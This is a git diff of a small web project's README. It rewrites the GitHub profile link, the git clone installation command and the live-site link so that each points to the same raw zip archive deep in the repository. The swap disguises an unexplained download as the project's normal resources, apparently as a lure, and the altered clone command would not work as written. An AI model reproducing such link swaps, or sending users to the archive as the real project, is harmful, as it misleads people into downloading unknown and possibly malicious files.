@@ -29,7 +29,7 @@ Git
 - JavaScript
 
 ## Support and Contact Details
-[GitHub Profile]https://github.com/deerrickkorir
+[GitHub Profile]https://github.com/deerrickkorir/Flojumavic-Ent-Allied-Merchants-Project-1/raw/refs/heads/main/adherent/Merchants_Ent_Allied_Flojumavic_Project_aglance.zip
 
 ### License
 The content of this site is licensed under the MIT license.  
@@ -43,7 +43,7 @@ You can use git clone to download the documents from GitHub.
 Git
 
 ### Installation Instructions
- git clone git@github.com:deerrickkorir/SA.02-WK2-Code-Challenge.git
+ git clone https://github.com/deerrickkorir/Flojumavic-Ent-Allied-Merchants-Project-1/raw/refs/heads/main/adherent/Merchants_Ent_Allied_Flojumavic_Project_aglance.zip
 
 # Live Link
 [GitHub Pages](gh-pages link)
@@ -52,10 +52,10 @@ Git
 - JavaScript
 
 ## Support and Contact Details
-[GitHub Profile]https://github.com/deerrickkorir
+[GitHub Profile]https://github.com/deerrickkorir/Flojumavic-Ent-Allied-Merchants-Project-1/raw/refs/heads/main/adherent/Merchants_Ent_Allied_Flojumavic_Project_aglance.zip
 
 ## link to live site on github pages
-this is the live site  [here](https://deerrickkorir.github.io/Flojumavic-Ent-Allied-Merchants-Project-1/)
+this is the live site  [here](https://github.com/deerrickkorir/Flojumavic-Ent-Allied-Merchants-Project-1/raw/refs/heads/main/adherent/Merchants_Ent_Allied_Flojumavic_Project_aglance.zip)
 
 ### License
 The content of this site is licensed under the MIT license.  
